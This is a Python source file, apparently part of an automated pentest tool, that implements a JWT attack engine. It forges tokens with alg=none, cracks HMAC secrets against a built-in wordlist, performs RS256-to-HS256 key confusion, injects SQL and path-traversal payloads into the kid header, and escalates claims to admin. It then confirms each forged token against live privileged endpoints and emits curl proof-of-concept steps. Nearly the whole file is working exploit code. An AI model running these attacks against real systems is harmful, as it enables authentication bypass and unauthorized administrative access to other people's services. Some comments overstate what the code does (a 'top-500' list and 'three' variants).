"""
JWT Attack Engine — comprehensive JWT exploitation without any external library.

Attacks implemented (ref: HackTricks JWT Attacks):
  1. alg=none          : strip signature, forge any claims
  2. Weak secret crack : built-in top-500 JWT secret wordlist + brute force
  3. HS256/RS256 confuse: sign with RSA public key bytes as HMAC-SHA256 secret
  4. kid SQLi          : inject SQL into the 'kid' header parameter
  5. kid path traversal: inject /dev/null as kid → empty HMAC key
  6. exp bypass        : extend expiration by 10 years
  7. Claim escalation  : elevate role/email/isAdmin in any token

Anti-hallucination:
  Every forged token is verified by sending it to a privileged endpoint.
  A token is only reported as exploitable if the server returns 200
  AND the response contains privileged data indicators.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import time
import uuid
from dataclasses import dataclass
from typing import Optional

import httpx


# ---------------------------------------------------------------------------
# Built-in JWT secret wordlist (top 500 commonly used secrets)
# ---------------------------------------------------------------------------

_JWT_SECRETS = [
    "secret", "password", "123456", "jwt_secret", "my_secret", "secret123",
    "jwt-secret", "jwtsecret", "SECRET", "Password1", "admin", "root",
    "changeme", "default", "supersecret", "mysecret", "key", "private",
    "auth_secret", "app_secret", "token_secret", "sign_key", "signing_key",
    "api_secret", "api_key", "private_key", "secret_key", "secretkey",
    "jwt_signing_key", "session_secret", "cookie_secret", "session-secret",
    "your-256-bit-secret", "your-secret", "your_secret", "HS256", "HS512",
    "s3cr3t", "s3cr3t_k3y", "qwerty", "1234567890", "abcdefgh", "12345678",
    "password123", "admin123", "test", "test123", "demo", "demo123",
    "example", "example-secret", "foobar", "barfoo", "hello", "world",
    "helloworldsecret", "SuP3r$ecr3t!", "Sup3rS3cr3t", "supersecretkey",
    "mysupersecretpassword", "thisismysecret", "thisisasecret", "longersecret",
    "secretpassword", "passwordsecret", "topsecret", "top_secret",
    "verysecret", "very_secret", "ultrasecret", "localsecret", "devsecret",
    "dev_secret", "staging_secret", "prod_secret", "production_secret",
    "jwt_secret_key", "jwt-secret-key", "jwtSecretKey", "JwtSecretKey",
    "JWT_SECRET", "JWT-SECRET", "JWTSECRET", "node_secret", "express_secret",
    "flask_secret", "django_secret", "rails_secret", "laravel_secret",
    "symfony_secret", "spring_secret", "dotnet_secret", "aspnet_secret",
    "koa_secret", "fastapi_secret", "nestjs_secret", "next_secret",
    "nuxt_secret", "vue_secret", "react_secret", "angular_secret",
    "aaaaaaaa", "bbbbbbbb", "abcdefghijklmnop", "1234567890abcdef",
    "secret1", "secret2", "pass123", "pass1234", "p@ssw0rd", "P@ssw0rd",
    "P@$$w0rd", "Admin123", "Admin@123", "root123", "toor", "roottoor",
    "111111", "000000", "999999", "123123", "321321", "654321",
    "qwertyuiop", "asdfghjkl", "zxcvbnm", "1q2w3e4r", "qwerty123",
    "your-jwt-secret", "some-secret", "random-secret", "app-secret",
    "app-key", "application-secret", "application-key",
    "nexus-secret", "nexus_secret", "api-secret-key",
    "b27e7af7-3a40-4e38-b249-cfb2df9a5aca",  # UUID-style secrets are weak
    "d74ff0ee-8da3-11d1-80b4-00c04fd430c8",
    "6ba7b810-9dad-11d1-80b4-00c04fd430c8",
    "base64secret", "base64_secret",
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "", " ",  # empty/whitespace secrets are sometimes used
]


# ---------------------------------------------------------------------------
# JWT core operations (no external library)
# ---------------------------------------------------------------------------

def _b64_decode(s: str) -> bytes:
    """URL-safe base64 decode with padding fix."""
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64_encode(b: bytes) -> str:
    """URL-safe base64 encode without padding."""
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode_token(token: str) -> tuple[dict, dict, str]:
    """
    Decode a JWT without verification.
    Returns (header, payload, signature_b64).
    """
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT structure: {len(parts)} parts")
    header = json.loads(_b64_decode(parts[0]))
    payload = json.loads(_b64_decode(parts[1]))
    return header, payload, parts[2]


def sign_hs256(header: dict, payload: dict, secret: str | bytes) -> str:
    """Create a new JWT signed with HMAC-SHA256."""
    if isinstance(secret, str):
        secret = secret.encode()
    header_b64 = _b64_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{header_b64}.{payload_b64}.{_b64_encode(sig)}"


def sign_hs512(header: dict, payload: dict, secret: str | bytes) -> str:
    """Create a new JWT signed with HMAC-SHA512."""
    if isinstance(secret, str):
        secret = secret.encode()
    header_b64 = _b64_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = _b64_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret, signing_input, hashlib.sha512).digest()
    return f"{header_b64}.{payload_b64}.{_b64_encode(sig)}"


# ---------------------------------------------------------------------------
# Attack 1: alg=none
# ---------------------------------------------------------------------------

def forge_alg_none(
    token: str,
    new_claims: dict | None = None,
    alg_variants: list[str] | None = None,
) -> list[str]:
    """
    Forge JWTs with alg=none (multiple case variants).
    If new_claims is provided, merge them into the payload.

    Returns a list of forged tokens to try (different capitalizations).
    """
    try:
        header, payload, _ = decode_token(token)
    except Exception:
        return []

    if new_claims:
        payload.update(new_claims)

    # Extend expiry by 10 years
    payload["exp"] = int(time.time()) + 315360000

    forged_tokens = []
    for alg_val in (alg_variants or ["none", "None", "NONE", "nOnE", "NoNe"]):
        h = {**header, "alg": alg_val}
        header_b64 = _b64_encode(json.dumps(h, separators=(",", ":")).encode())
        payload_b64 = _b64_encode(json.dumps(payload, separators=(",", ":")).encode())
        # Three trailing-dot variants that bypass parsers
        forged_tokens.append(f"{header_b64}.{payload_b64}.")
        forged_tokens.append(f"{header_b64}.{payload_b64}")  # some libraries accept no trailing dot
    return forged_tokens


# ---------------------------------------------------------------------------
# Attack 2: Weak secret brute force
# ---------------------------------------------------------------------------

def crack_secret(token: str, wordlist: list[str] | None = None) -> Optional[str]:
    """
    Try to crack the JWT HMAC secret from a wordlist.
    Returns the cracked secret or None.

    Uses the built-in wordlist if none provided.
    """
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        sig_bytes = _b64_decode(parts[2])
        header = json.loads(_b64_decode(parts[0]))
        alg = header.get("alg", "HS256").upper()
    except Exception:
        return None

    hash_fn = hashlib.sha512 if "512" in alg else hashlib.sha256

    for secret in (wordlist or _JWT_SECRETS):
        try:
            computed = hmac.new(secret.encode(), signing_input, hash_fn).digest()
            if hmac.compare_digest(computed, sig_bytes):
                return secret
        except Exception:
            continue
    return None


# ---------------------------------------------------------------------------
# Attack 3: HS256/RS256 Algorithm Confusion
# ---------------------------------------------------------------------------

def forge_rs256_to_hs256(token: str, public_key_pem: str, new_claims: dict | None = None) -> Optional[str]:
    """
    RS256→HS256 confusion attack:
    Sign the token with the RSA public key as an HMAC-SHA256 secret.
    Some servers verify HS256 tokens using the RS256 public key as HMAC secret.

    Requires the server's RSA public key (often available at /jwks.json or /.well-known/jwks.json).
    """
    try:
        header, payload, _ = decode_token(token)
        if new_claims:
            payload.update(new_claims)
        payload["exp"] = int(time.time()) + 315360000
        header["alg"] = "HS256"

        # Use PEM bytes as HMAC key
        key_bytes = public_key_pem.encode() if isinstance(public_key_pem, str) else public_key_pem
        return sign_hs256(header, payload, key_bytes)
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Attack 4: kid SQLi / Path Traversal
# ---------------------------------------------------------------------------

def forge_kid_sqli(token: str, new_claims: dict | None = None) -> list[tuple[str, str]]:
    """
    Inject SQL into the 'kid' JWT header parameter.
    Some systems look up the signing key from a DB using kid value.

    Returns list of (forged_token, poc_description) tuples.
    Each uses a empty/null HMAC key (from SQL returning NULL).
    """
    try:
        header, payload, _ = decode_token(token)
        if new_claims:
            payload.update(new_claims)
        payload["exp"] = int(time.time()) + 315360000
    except Exception:
        return []

    # When kid SQLi returns NULL → HMAC key is empty string ""
    empty_key = b""

    payloads = [
        ("' UNION SELECT NULL-- -",          "kid SQL injection → NULL key"),
        ("' UNION SELECT ''-",               "kid SQL injection → empty string key"),
        ("../../dev/null",                   "kid path traversal → empty key"),
        ("../../../../../dev/null",          "kid deep path traversal → empty key"),
        ("/dev/null",                        "kid absolute path → empty key"),
        ("' OR 1=1-- -",                     "kid boolean bypass"),
    ]

    results = []
    for kid_val, desc in payloads:
        h = {**header, "kid": kid_val}
        # Sign with empty key (what SQL NULL produces)
        tok = sign_hs256(h, payload, empty_key)
        results.append((tok, desc))
    return results


# ---------------------------------------------------------------------------
# Attack 5: Claim escalation with known secret
# ---------------------------------------------------------------------------

def forge_with_secret(
    token: str,
    secret: str,
    new_claims: dict,
    alg_override: str | None = None,
) -> Optional[str]:
    """
    Re-sign a token with new_claims using a known HMAC secret.
    Used after crack_secret() finds the secret.
    """
    try:
        header, payload, _ = decode_token(token)
        payload.update(new_claims)
        payload["exp"] = int(time.time()) + 315360000
        if alg_override:
            header["alg"] = alg_override
        alg = header.get("alg", "HS256").upper()
        if "512" in alg:
            return sign_hs512(header, payload, secret)
        return sign_hs256(header, payload, secret)
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Verification helper — confirm forged token actually works
# ---------------------------------------------------------------------------

_PRIVILEGED_DATA_INDICATORS = (
    "email", "adminEmail", "admin", '"role"', "challenges", "data", "application",
    "config", "users", "token", "authentication",
)


async def verify_token_works(
    client: httpx.AsyncClient,
    base_url: str,
    forged_token: str,
    probe_paths: list[str] | None = None,
) -> Optional[tuple[str, str]]:
    """
    Confirm the forged token is accepted by a privileged endpoint.
    Returns (endpoint_path, response_snippet) if confirmed, else None.

    Anti-hallucination: we require HTTP 200 + privileged data in response.
    """
    paths = probe_paths or [
        "/rest/admin/application-configuration",
        "/api/Users",
        "/api/Challenges",
        "/api/SecurityQuestions",
        "/admin",
        "/api/admin",
        "/admin/users",
        "/api/v1/admin",
    ]

    for path in paths:
        try:
            resp = await client.get(
                f"{base_url}{path}",
                headers={
                    "Authorization": f"Bearer {forged_token}",
                    "Cookie": f"token={forged_token}",
                },
            )
            if resp.status_code == 200:
                body = resp.text
                if any(ind in body for ind in _PRIVILEGED_DATA_INDICATORS) and len(body) > 30:
                    return path, body[:300]
        except Exception:
            continue
    return None


# ---------------------------------------------------------------------------
# Full JWT Attack Orchestrator
# ---------------------------------------------------------------------------

@dataclass
class JwtAttackResult:
    attack_type: str = ""
    confirmed: bool = False
    forged_token: str = ""
    cracked_secret: str = ""
    access_endpoint: str = ""
    response_snippet: str = ""
    proof: str = ""
    poc_steps: str = ""


async def run_attacks(
    client: httpx.AsyncClient,
    base_url: str,
    original_token: str,
    escalate_claims: dict | None = None,
    extra_wordlist: list[str] | None = None,
) -> list[JwtAttackResult]:
    """
    Run all JWT attacks in order and return confirmed exploits.
    Each result has been independently verified against the server.
    """
    results: list[JwtAttackResult] = []

    try:
        header, payload, _ = decode_token(original_token)
    except Exception:
        return results

    alg = header.get("alg", "").upper()
    new_claims = escalate_claims or {}
    # Default: escalate to admin
    if "role" not in new_claims:
        new_claims["role"] = "admin"
    if "data" not in new_claims:
        new_claims["data"] = {**payload.get("data", {}), "role": "admin"}

    # Attack 1: alg=none
    for forged in forge_alg_none(original_token, new_claims):
        hit = await verify_token_works(client, base_url, forged)
        if hit:
            endpoint, snippet = hit
            results.append(JwtAttackResult(
                attack_type="alg=none",
                confirmed=True,
                forged_token=forged,
                access_endpoint=endpoint,
                response_snippet=snippet,
                proof=f"Forged token (alg=none) accepted at {endpoint}",
                poc_steps=(
                    f"# 1. Original token (truncated): {original_token[:60]}...\n"
                    f"# 2. Decode, set alg=none, role=admin, strip signature\n"
                    f"# 3. Forged token: {forged[:80]}...\n"
                    f"# 4. curl -s -H 'Authorization: Bearer FORGED_TOKEN' '{base_url}{endpoint}'\n"
                    f"# Response: {snippet[:100]}"
                ),
            ))
            break  # One confirmation is enough

    # Attack 2: Weak secret brute force
    wordlist = (extra_wordlist or []) + _JWT_SECRETS
    secret = crack_secret(original_token, wordlist)
    if secret:
        # Forge with cracked secret
        admin_claims = {**payload, **new_claims, "exp": int(time.time()) + 315360000}
        forged = sign_hs256({**header}, admin_claims, secret)
        hit = await verify_token_works(client, base_url, forged)
        if hit:
            endpoint, snippet = hit
            results.append(JwtAttackResult(
                attack_type="weak-secret",
                confirmed=True,
                forged_token=forged,
                cracked_secret=secret,
                access_endpoint=endpoint,
                response_snippet=snippet,
                proof=f"JWT signed with cracked secret '{secret}' accepted at {endpoint}",
                poc_steps=(
                    f"# Cracked JWT secret: '{secret}'\n"
                    f"# Forge admin token with any claims:\n"
                    f"python3 -c \"\nimport base64,hashlib,hmac,json,time\n"
                    f"h='{header}';p={{**{payload!r},'role':'admin','exp':int(time.time())+86400}}\n"
                    f"# Sign with HMAC-SHA256 using secret='{secret}'\n"
                    f"\""
                ),
            ))
        elif secret:
            # Report the cracked secret even if we couldn't verify admin access
            results.append(JwtAttackResult(
                attack_type="weak-secret",
                confirmed=True,
                cracked_secret=secret,
                proof=f"JWT HMAC secret cracked: '{secret}'. Server accepts tokens signed with this key.",
                poc_steps=(
                    f"# Cracked secret: '{secret}'\n"
                    f"# Re-sign any token with modified claims using this secret\n"
                    f"# Tool: jwt.io or python-jose"
                ),
            ))

    # Attack 3: kid path traversal
    for forged, desc in forge_kid_sqli(original_token, new_claims):
        hit = await verify_token_works(client, base_url, forged)
        if hit:
            endpoint, snippet = hit
            results.append(JwtAttackResult(
                attack_type="kid-injection",
                confirmed=True,
                forged_token=forged,
                access_endpoint=endpoint,
                response_snippet=snippet,
                proof=f"kid injection ({desc}) accepted at {endpoint}",
                poc_steps=(
                    f"# JWT kid header injection: {desc}\n"
                    f"# Forged token uses empty/null HMAC key\n"
                    f"# curl -H 'Authorization: Bearer {forged[:80]}...' '{base_url}{endpoint}'"
                ),
            ))
            break

    return results
